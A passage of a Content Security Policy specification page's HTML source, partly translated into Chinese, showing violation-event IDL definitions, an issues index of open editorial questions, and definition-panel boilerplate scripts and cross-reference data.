    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-originalpolicy"><code><c- g>originalPolicy</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-sourcefile"><code><c- g>sourceFile</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-readonly data-type="DOMString" href="#dom-securitypolicyviolationevent-sample"><code><c- g>sample</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <a data-readonly data-type="SecurityPolicyViolationEventDisposition" href="#dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-readonly data-type="unsigned short" href="#dom-securitypolicyviolationevent-statuscode"><code><c- g>statusCode</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-linenumber"><code><c- g>lineNumber</c-></code></a>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-readonly data-type="unsigned long" href="#dom-securitypolicyviolationevent-columnnumber"><code><c- g>columnNumber</c-></code></a>;
};

<c- b>dictionary</c-> <a href="#dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></a> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit"><c- n>EventInit</c-></a> {
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString      " href="#dom-securitypolicyviolationeventinit-documenturi"><code><c- g>documentURI</c-></code></a> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString      " href="#dom-securitypolicyviolationeventinit-referrer"><code><c- g>referrer</c-></code></a> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString      " href="#dom-securitypolicyviolationeventinit-blockeduri"><code><c- g>blockedURI</c-></code></a> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-default="&quot;&quot;" data-type="DOMString      " href="#dom-securitypolicyviolationeventinit-violateddirective"><code><c- g>violatedDirective</c-></code></a> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-default="&quot;&quot;" data-type="DOMString      " href="#dom-securitypolicyviolationeventinit-effectivedirective"><code><c- g>effectiveDirective</c-></code></a> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-default="&quot;&quot;" data-type="DOMString      " href="#dom-securitypolicyviolationeventinit-originalpolicy"><code><c- g>originalPolicy</c-></code></a> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString"><c- b>USVString</c-></a>      <a data-default="&quot;&quot;" data-type="USVString      " href="#dom-securitypolicyviolationeventinit-sourcefile"><code><c- g>sourceFile</c-></code></a> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString"><c- b>DOMString</c-></a>      <a data-default="&quot;&quot;" data-type="DOMString      " href="#dom-securitypolicyviolationeventinit-sample"><code><c- g>sample</c-></code></a> = "";
    <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <a data-default="&quot;enforce&quot;" data-type="SecurityPolicyViolationEventDisposition " href="#dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code></a> = "enforce";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <a data-default="0" data-type="unsigned short " href="#dom-securitypolicyviolationeventinit-statuscode"><code><c- g>statusCode</c-></code></a> = 0;
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-default="0" data-type="unsigned long  " href="#dom-securitypolicyviolationeventinit-linenumber"><code><c- g>lineNumber</c-></code></a> = 0;
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>  <a data-default="0" data-type="unsigned long  " href="#dom-securitypolicyviolationeventinit-columnnumber"><code><c- g>columnNumber</c-></code></a> = 0;
};

</pre>
    <h2 class="no-num no-ref heading settled" id="issues-index"><span class="content">问题索引</span><a class="self-link"
            href="#issues-index"></a></h2>
    <div style="counter-reset:issue">
        <div class="issue"> 这种情况在任何地方有具体规定吗？我在 <a data-link-type="biblio" href="#biblio-ecma262"
                title="ECMAScript® 语言规范">[ECMA262]</a> 中没有看到有用的内容。<a class="issue-return" href="#issue-ee968c9a"
                title="跳转到章节">↵</a></div>
        <div class="issue"> 我们到底如何获得状态码？我们实际上并没有存储它。<a class="issue-return" href="#issue-d43ce829" title="跳转到章节">↵</a>
        </div>
        <div class="issue"> 样式表加载尚未在 WHATWG 的 HTML 中与 Fetch 集成。<a
                href="https://github.com/whatwg/html/issues/968">[Issue #whatwg/html#968]</a> <a class="issue-return"
                href="#issue-5599665e" title="跳转到章节">↵</a></div>
        <div class="issue"> 这需要更详细的解释。<a href="https://github.com/w3c/webappsec-csp/issues/212">[Issue
                #w3c/webappsec-csp#212]</a> <a class="issue-return" href="#issue-ba1a0a35" title="跳转到章节">↵</a></div>
        <div class="issue"> 对执行上下文做一些有趣的事情，以便锁定有趣的 CSSOM 算法。我认为 CSSOM 在这方面没有提供任何钩子，因此我们可以与他们合作提出合理的解决方案。<a
                class="issue-return" href="#issue-6fa220c3" title="跳转到章节">↵</a></div>
        <div class="issue"> 如果我们计划在这里使用它，我们需要在 HTML 中某种挂钩来记录此错误。<a
                href="https://github.com/whatwg/html/issues/3257">[Issue #whatwg/html#3257]</a> <a class="issue-return"
                href="#issue-820579ab" title="跳转到章节">↵</a></div>
        <div class="issue"> 此处理旨在减轻悬空标记攻击的风险，该攻击从现有元素中窃取 nonce 以加载注入脚本。然而，这非常昂贵，因为它要求我们遍历所有属性及其值以确定脚本是否应执行。我们尝试通过仅在
            <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script">script</a></code>
            元素中存在 nonce 时执行此检查来尽量减少影响，但在我们了解其影响之前，我们应将此算法视为“有风险”。<a
                href="https://github.com/w3c/webappsec-csp/issues/98">[Issue #w3c/webappsec-csp#98]</a> <a
                class="issue-return" href="#issue-4592ac7e" title="跳转到章节">↵</a>
        </div>
        <div class="issue"> 这应该处理动态插入的内联脚本的 <code>'strict-dynamic'</code>。<a
                href="https://github.com/w3c/webappsec-csp/issues/426">[Issue #w3c/webappsec-csp#426]</a> <a
                class="issue-return" href="#issue-fde03f65" title="跳转到章节">↵</a></div>
        <div class="issue"> 当前 HTML 规范的解析算法在 <a href="#is-element-nonceable">§ 6.7.3.1 元素是否可带有 nonce?</a>
            算法运行之前删除了这些信息，这使得实际上无法检测重复的属性。<a href="https://github.com/whatwg/html/issues/3257">[Issue
                #whatwg/html#3257]</a> <a class="issue-return" href="#issue-74cb0fbd" title="跳转到章节">↵</a></div>
    </div>
    <script>/* Boilerplate: script-dfn-panel */
        "use strict";
        {
            const dfnsJson = window.dfnsJson || {};

            function genDfnPanel({ dfnID, url, dfnText, refSections, external }) {
                return mk.aside({
                    class: "dfn-panel",
                    id: `infopanel-for-${dfnID}`,
                    "data-for": dfnID,
                    "aria-labelled-by": `infopaneltitle-for-${dfnID}`,
                },
                    mk.span({ id: `infopaneltitle-for-${dfnID}`, style: "display:none" },
                        `Info about the '${dfnText}' ${external ? "external" : ""} reference.`),
                    mk.a({ href: url }, url),
                    mk.b({}, "Referenced in:"),
                    mk.ul({},
                        ...refSections.map(section =>
                            mk.li({},
                                ...section.refs.map((ref, refI) =>
                                    [
                                        mk.a({
                                            href: `#${ref.id}`
                                        },
                                            (refI == 0) ? section.title : `(${refI + 1})`
                                        ),
                                        " ",
                                    ]
                                ),
                            ),
                        ),
                    ),
                );
            }

            function genAllDfnPanels() {
                for (const panelData of Object.values(window.dfnpanelData)) {
                    const dfnID = panelData.dfnID;
                    const dfn = document.getElementById(dfnID);
                    if (!dfn) {
                        console.log(`Can't find dfn#${dfnID}.`, panelData);
                    } else {
                        const panel = genDfnPanel(panelData);
                        append(document.body, panel);
                        insertDfnPopupAction(dfn, panel)
                    }
                }
            }

            document.addEventListener("DOMContentLoaded", () => {
                genAllDfnPanels();

                // Add popup behavior to all dfns to show the corresponding dfn-panel.
                var dfns = queryAll('.dfn-paneled');
                for (let dfn of dfns) { ; }

                document.body.addEventListener("click", (e) => {
                    // If not handled already, just hide all dfn panels.
                    hideAllDfnPanels();
                });
            })


            function hideAllDfnPanels() {
                // Turn off any currently "on" or "activated" panels.
                queryAll(".dfn-panel.on, .dfn-panel.activated").forEach(el => hideDfnPanel(el));
            }

            function showDfnPanel(dfnPanel, dfn) {
                hideAllDfnPanels(); // Only display one at this time.
                dfn.setAttribute("aria-expanded", "true");
                dfnPanel.classList.add("on");
                dfnPanel.style.left = "5px";
                dfnPanel.style.top = "0px";
                const panelRect = dfnPanel.getBoundingClientRect();
                const panelWidth = panelRect.right - panelRect.left;
                if (panelRect.right > document.body.scrollWidth) {
                    // Panel's overflowing the screen.
                    // Just drop it below the dfn and flip it rightward instead.
                    // This still wont' fix things if the screen is *really* wide,
                    // but fixing that's a lot harder without 'anchor()'.
                    dfnPanel.style.top = "1.5em";
                    dfnPanel.style.left = "auto";
                    dfnPanel.style.right = "0px";
                }
            }

            function pinDfnPanel(dfnPanel) {
                // Switch it to "activated" state, which pins it.
                dfnPanel.classList.add("activated");
                dfnPanel.style.left = null;
                dfnPanel.style.top = null;
            }

            function hideDfnPanel(dfnPanel, dfn) {
                if (!dfn) {
                    dfn = document.getElementById(dfnPanel.getAttribute("data-for"));
                }
                dfn.setAttribute("aria-expanded", "false")
                dfnPanel.classList.remove("on");
                dfnPanel.classList.remove("activated");
            }

            function toggleDfnPanel(dfnPanel, dfn) {
                if (dfnPanel.classList.contains("on")) {
                    hideDfnPanel(dfnPanel, dfn);
                } else {
                    showDfnPanel(dfnPanel, dfn);
                }
            }

            function insertDfnPopupAction(dfn, dfnPanel) {
                // Find dfn panel
                const panelWrapper = document.createElement('span');
                panelWrapper.appendChild(dfnPanel);
                panelWrapper.style.position = "relative";
                panelWrapper.style.height = "0px";
                dfn.insertAdjacentElement("afterend", panelWrapper);
                dfn.setAttribute('role', 'button');
                dfn.setAttribute('aria-expanded', 'false')
                dfn.tabIndex = 0;
                dfn.classList.add('has-dfn-panel');
                dfn.addEventListener('click', (event) => {
                    showDfnPanel(dfnPanel, dfn);
                    event.stopPropagation();
                });
                dfn.addEventListener('keypress', (event) => {
                    const kc = event.keyCode;
                    // 32->Space, 13->Enter
                    if (kc == 32 || kc == 13) {
                        toggleDfnPanel(dfnPanel, dfn);
                        event.stopPropagation();
                        event.preventDefault();
                    }
                });

                dfnPanel.addEventListener('click', (event) => {
                    if (event.target.nodeName == 'A') {
                        pinDfnPanel(dfnPanel);
                    }
                    event.stopPropagation();
                });

                dfnPanel.addEventListener('keydown', (event) => {
                    if (event.keyCode == 27) { // Escape key
                        hideDfnPanel(dfnPanel, dfn);
                        event.stopPropagation();
                        event.preventDefault();
                    }
                })
            }
        }
    </script>
    <script>/* Boilerplate: script-dfn-panel */
        "use strict";
        {
            const dfnsJson = window.dfnsJson || {};

            function genDfnPanel({ dfnID, url, dfnText, refSections, external }) {
                return mk.aside({
                    class: "dfn-panel",
                    id: `infopanel-for-${dfnID}`,
                    "data-for": dfnID,
                    "aria-labelled-by": `infopaneltitle-for-${dfnID}`,
                },
                    mk.span({ id: `infopaneltitle-for-${dfnID}`, style: "display:none" },
                        `Info about the '${dfnText}' ${external ? "external" : ""} reference.`),
                    mk.a({ href: url }, url),
                    mk.b({}, "Referenced in:"),
                    mk.ul({},
                        ...refSections.map(section =>
                            mk.li({},
                                ...section.refs.map((ref, refI) =>
                                    [
                                        mk.a({
                                            href: `#${ref.id}`
                                        },
                                            (refI == 0) ? section.title : `(${refI + 1})`
                                        ),
                                        " ",
                                    ]
                                ),
                            ),
                        ),
                    ),
                );
            }

            function genAllDfnPanels() {
                for (const panelData of Object.values(window.dfnpanelData)) {
                    const dfnID = panelData.dfnID;
                    const dfn = document.getElementById(dfnID);
                    if (!dfn) {
                        console.log(`Can't find dfn#${dfnID}.`, panelData);
                    } else {
                        const panel = genDfnPanel(panelData);
                        append(document.body, panel);
                        insertDfnPopupAction(dfn, panel)
                    }
                }
            }

            document.addEventListener("DOMContentLoaded", () => {
                genAllDfnPanels();

                // Add popup behavior to all dfns to show the corresponding dfn-panel.
                var dfns = queryAll('.dfn-paneled');
                for (let dfn of dfns) { ; }

                document.body.addEventListener("click", (e) => {
                    // If not handled already, just hide all dfn panels.
                    hideAllDfnPanels();
                });
            })


            function hideAllDfnPanels() {
                // Turn off any currently "on" or "activated" panels.
                queryAll(".dfn-panel.on, .dfn-panel.activated").forEach(el => hideDfnPanel(el));
            }

            function showDfnPanel(dfnPanel, dfn) {
                hideAllDfnPanels(); // Only display one at this time.
                dfn.setAttribute("aria-expanded", "true");
                dfnPanel.classList.add("on");
                dfnPanel.style.left = "5px";
                dfnPanel.style.top = "0px";
                const panelRect = dfnPanel.getBoundingClientRect();
                const panelWidth = panelRect.right - panelRect.left;
                if (panelRect.right > document.body.scrollWidth) {
                    // Panel's overflowing the screen.
                    // Just drop it below the dfn and flip it rightward instead.
                    // This still wont' fix things if the screen is *really* wide,
                    // but fixing that's a lot harder without 'anchor()'.
                    dfnPanel.style.top = "1.5em";
                    dfnPanel.style.left = "auto";
                    dfnPanel.style.right = "0px";
                }
            }

            function pinDfnPanel(dfnPanel) {
                // Switch it to "activated" state, which pins it.
                dfnPanel.classList.add("activated");
                dfnPanel.style.left = null;
                dfnPanel.style.top = null;
            }

            function hideDfnPanel(dfnPanel, dfn) {
                if (!dfn) {
                    dfn = document.getElementById(dfnPanel.getAttribute("data-for"));
                }
                dfn.setAttribute("aria-expanded", "false")
                dfnPanel.classList.remove("on");
                dfnPanel.classList.remove("activated");
            }

            function toggleDfnPanel(dfnPanel, dfn) {
                if (dfnPanel.classList.contains("on")) {
                    hideDfnPanel(dfnPanel, dfn);
                } else {
                    showDfnPanel(dfnPanel, dfn);
                }
            }

            function insertDfnPopupAction(dfn, dfnPanel) {
                // Find dfn panel
                const panelWrapper = document.createElement('span');
                panelWrapper.appendChild(dfnPanel);
                panelWrapper.style.position = "relative";
                panelWrapper.style.height = "0px";
                dfn.insertAdjacentElement("afterend", panelWrapper);
                dfn.setAttribute('role', 'button');
                dfn.setAttribute('aria-expanded', 'false')
                dfn.tabIndex = 0;
                dfn.classList.add('has-dfn-panel');
                dfn.addEventListener('click', (event) => {
                    showDfnPanel(dfnPanel, dfn);
                    event.stopPropagation();
                });
                dfn.addEventListener('keypress', (event) => {
                    const kc = event.keyCode;
                    // 32->Space, 13->Enter
                    if (kc == 32 || kc == 13) {
                        toggleDfnPanel(dfnPanel, dfn);
                        event.stopPropagation();
                        event.preventDefault();
                    }
                });

                dfnPanel.addEventListener('click', (event) => {
                    if (event.target.nodeName == 'A') {
                        pinDfnPanel(dfnPanel);
                    }
                    event.stopPropagation();
                });

                dfnPanel.addEventListener('keydown', (event) => {
                    if (event.keyCode == 27) { // Escape key
                        hideDfnPanel(dfnPanel, dfn);
                        event.stopPropagation();
                        event.preventDefault();
                    }
                })
            }
        }
    </script>
    <script>/* Boilerplate: script-dfn-panel-json */
        window.dfnpanelData = {};
        window.dfnpanelData['6d126909'] = { "dfnID": "6d126909", "url": "https://www.w3.org/TR/CSP3/#abstract-opdef-parse-a-serialized-csp-list", "dfnText": "parse a serialized CSP list", "refSections": [{ "refs": [{ "id": "ref-for-abstract-opdef-parse-a-serialized-csp-list" }, { "id": "ref-for-abstract-opdef-parse-a-serialized-csp-list\u2460" }], "title": "2.2.2. \n    Parse response\u2019s Content Security Policies\n  " }], "external": true };
        window.dfnpanelData['3eef835e'] = { "dfnID": "3eef835e", "url": "https://www.w3.org/TR/css-cascade-5/#at-ruledef-import", "dfnText": "@import", "refSections": [{ "refs": [{ "id": "ref-for-at-ruledef-import" }], "title": "6.1.13. style-src" }], "external": true };
        window.dfnpanelData['4ffecae2'] = { "dfnID": "4ffecae2", "url": "https://www.w3.org/TR/cssom-1/#insert-a-css-rule", "dfnText": "insert a css rule", "refSections": [{ "refs": [{ "id": "ref-for-insert-a-css-rule" }], "title": "6.1.13. style-src" }], "external": true };
        window.dfnpanelData['e49ee8ab'] = { "dfnID": "e49ee8ab", "url": "https://www.w3.org/TR/cssom-1/#parse-a-css-declaration-block", "dfnText": "parse a css declaration block", "refSections": [{ "refs": [{ "id": "ref-for-parse-a-css-declaration-block" }], "title": "6.1.13. style-src" }], "external": true };
        window.dfnpanelData['30cbbf14'] = { "dfnID": "30cbbf14", "url": "https://www.w3.org/TR/cssom-1/#parse-a-css-rule", "dfnText": "parse a css rule", "refSections": [{ "refs": [{ "id": "ref-for-parse-a-css-rule" }], "title": "6.1.13. style-src" }], "external": true };
        window.dfnpanelData['4f06d0ed'] = { "dfnID": "4f06d0ed", "url": "https://www.w3.org/TR/cssom-1/#parse-a-group-of-selectors", "dfnText": "parse a group of selectors", "refSections": [{ "refs": [{ "id": "ref-for-parse-a-group-of-selectors" }], "title": "6.1.13. style-src" }], "external": true };
        window.dfnpanelData['85394472'] = { "dfnID": "85394472", "url": "https://dom.spec.whatwg.org/#document", "dfnText": "Document", "refSections": [{ "refs": [{ "id": "ref-for-document" }], "title": "1.2. Goals" }, { "refs": [{ "id": "ref-for-document\u2460" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-document\u2461" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-document\u2462" }], "title": "3.3. \n    The <meta> element\n  " }, { "refs": [{ "id": "ref-for-document\u2463" }], "title": "4.2.1. \n    Run CSP initialization for a Document\n  " }, { "refs": [{ "id": "ref-for-document\u2464" }], "title": "4.2.2. \n    Retrieve the CSP list of an object\n  " }, { "refs": [{ "id": "ref-for-document\u2465" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-document\u2466" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-document\u2467" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-document\u2468" }], "title": "6.1.13. style-src" }, { "refs": [{ "id": "ref-for-document\u2460\u24ea" }], "title": "6.3.1. base-uri" }, { "refs": [{ "id": "ref-for-document\u2460\u2460" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-document\u2460\u2461" }, { "id": "ref-for-document\u2460\u2462" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }, { "refs": [{ "id": "ref-for-document\u2460\u2463" }, { "id": "ref-for-document\u2460\u2464" }, { "id": "ref-for-document\u2460\u2465" }], "title": "7.8. \n    CSP Inheriting to avoid bypasses\n  " }], "external": true };
        window.dfnpanelData['296f3551'] = { "dfnID": "296f3551", "url": "https://dom.spec.whatwg.org/#element", "dfnText": "Element", "refSections": [{ "refs": [{ "id": "ref-for-element" }], "title": "2.3. Directives" }, { "refs": [{ "id": "ref-for-element\u2460" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-element\u2461" }], "title": "6.1.3.3. \n    default-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-element\u2462" }], "title": "6.1.10.3. \n    script-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-element\u2463" }], "title": "6.1.11.3. \n    script-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-element\u2464" }], "title": "6.1.12.1. \n    script-src-attr Inline Check\n  " }, { "refs": [{ "id": "ref-for-element\u2465" }], "title": "6.1.13.3. \n    style-src Inline Check\n  " }, { "refs": [{ "id": "ref-for-element\u2466" }], "title": "6.1.14.3. \n    style-src-elem Inline Check\n  " }, { "refs": [{ "id": "ref-for-element\u2467" }], "title": "6.1.15.1. \n    style-src-attr Inline Check\n  " }, { "refs": [{ "id": "ref-for-element\u2468" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }, { "refs": [{ "id": "ref-for-element\u2460\u24ea" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": true };
        window.dfnpanelData['129bdae8'] = { "dfnID": "129bdae8", "url": "https://dom.spec.whatwg.org/#event", "dfnText": "Event", "refSections": [{ "refs": [{ "id": "ref-for-event" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": true };
        window.dfnpanelData['44a7708c'] = { "dfnID": "44a7708c", "url": "https://dom.spec.whatwg.org/#dictdef-eventinit", "dfnText": "EventInit", "refSections": [{ "refs": [{ "id": "ref-for-dictdef-eventinit" }], "title": "5.1. \n    Violation DOM Events\n  " }], "external": true };
        window.dfnpanelData['2bc0cdf4'] = { "dfnID": "2bc0cdf4", "url": "https://dom.spec.whatwg.org/#eventtarget", "dfnText": "EventTarget", "refSections": [{ "refs": [{ "id": "ref-for-eventtarget" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['77211728'] = { "dfnID": "77211728", "url": "https://dom.spec.whatwg.org/#concept-element-attribute", "dfnText": "attribute list", "refSections": [{ "refs": [{ "id": "ref-for-concept-element-attribute" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }], "external": true };
        window.dfnpanelData['0c0ceb78'] = { "dfnID": "0c0ceb78", "url": "https://dom.spec.whatwg.org/#dom-event-bubbles", "dfnText": "bubbles", "refSections": [{ "refs": [{ "id": "ref-for-dom-event-bubbles" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['8b547cc7'] = { "dfnID": "8b547cc7", "url": "https://dom.spec.whatwg.org/#dom-event-composed", "dfnText": "composed", "refSections": [{ "refs": [{ "id": "ref-for-dom-event-composed" }, { "id": "ref-for-dom-event-composed\u2460" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['9638f92b'] = { "dfnID": "9638f92b", "url": "https://dom.spec.whatwg.org/#connected", "dfnText": "connected", "refSections": [{ "refs": [{ "id": "ref-for-connected" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['5fd23811'] = { "dfnID": "5fd23811", "url": "https://dom.spec.whatwg.org/#concept-event-fire", "dfnText": "fire an event", "refSections": [{ "refs": [{ "id": "ref-for-concept-event-fire" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['c62cd7cf'] = { "dfnID": "c62cd7cf", "url": "https://dom.spec.whatwg.org/#concept-document-origin", "dfnText": "origin", "refSections": [{ "refs": [{ "id": "ref-for-concept-document-origin" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }], "external": true };
        window.dfnpanelData['ea2049db'] = { "dfnID": "ea2049db", "url": "https://dom.spec.whatwg.org/#concept-shadow-including-root", "dfnText": "shadow-including root", "refSections": [{ "refs": [{ "id": "ref-for-concept-shadow-including-root" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['e8478f36'] = { "dfnID": "e8478f36", "url": "https://dom.spec.whatwg.org/#dom-event-target", "dfnText": "target", "refSections": [{ "refs": [{ "id": "ref-for-dom-event-target" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['7414e9fd'] = { "dfnID": "7414e9fd", "url": "https://tc39.github.io/ecma262#sec-function-objects", "dfnText": "Function()", "refSections": [{ "refs": [{ "id": "ref-for-sec-function-objects" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['78dac792'] = { "dfnID": "78dac792", "url": "https://tc39.github.io/ecma262#sec-hostensurecancompilestrings", "dfnText": "HostEnsureCanCompileStrings()", "refSections": [{ "refs": [{ "id": "ref-for-sec-hostensurecancompilestrings" }], "title": "4.4. Integration with ECMAScript" }], "external": true };
        window.dfnpanelData['bccca632'] = { "dfnID": "bccca632", "url": "https://tc39.github.io/ecma262#sec-eval-x", "dfnText": "eval()", "refSections": [{ "refs": [{ "id": "ref-for-sec-eval-x" }], "title": "1.2. Goals" }, { "refs": [{ "id": "ref-for-sec-eval-x\u2460" }], "title": "6.1.10. script-src" }], "external": true };
        window.dfnpanelData['656bb36c'] = { "dfnID": "656bb36c", "url": "https://tc39.github.io/ecma262#realm", "dfnText": "realm", "refSections": [{ "refs": [{ "id": "ref-for-realm" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-realm\u2460" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }], "external": true };
        window.dfnpanelData['0303e8e5'] = { "dfnID": "0303e8e5", "url": "https://encoding.spec.whatwg.org/#utf-8-encode", "dfnText": "utf-8 encode", "refSections": [{ "refs": [{ "id": "ref-for-utf-8-encode" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-utf-8-encode\u2460" }], "title": "8.4. \n      Allowing external JavaScript via hashes\n    " }], "external": true };
        window.dfnpanelData['8e9945a0'] = { "dfnID": "8e9945a0", "url": "https://fetch.spec.whatwg.org/#concept-request-body", "dfnText": "body", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-body" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['857d5516'] = { "dfnID": "857d5516", "url": "https://fetch.spec.whatwg.org/#concept-request-client", "dfnText": "client", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-client" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-concept-request-client\u2460" }, { "id": "ref-for-concept-request-client\u2461" }, { "id": "ref-for-concept-request-client\u2462" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-client\u2463" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-concept-request-client\u2464" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['902380f7'] = { "dfnID": "902380f7", "url": "https://fetch.spec.whatwg.org/#concept-request-credentials-mode", "dfnText": "credentials mode", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-credentials-mode" }], "title": "5.5. \n    Report a violation\n  " }], "external": true };
        window.dfnpanelData['784f01de'] = { "dfnID": "784f01de", "url": "https://fetch.spec.whatwg.org/#concept-request-nonce-metadata", "dfnText": "cryptographic nonce metadata", "refSections": [{ "refs": [{ "id": "ref-for-concept-request-nonce-metadata" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-concept-request-nonce-metadata\u2460" }], "title": "6.1.13.1. \n    style-src Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request-nonce-metadata\u2461" }], "title": "6.1.13.2. \n    style-src Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request-nonce-metadata\u2462" }], "title": "6.1.14.1. \n    style-src-elem Pre-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request-nonce-metadata\u2463" }], "title": "6.1.14.2. \n    style-src-elem Post-request Check\n  " }, { "refs": [{ "id": "ref-for-concept-request-nonce-metadata\u2464" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request-nonce-metadata\u2465" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-concept-request-nonce-metadata\u2466" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }], "external": true };
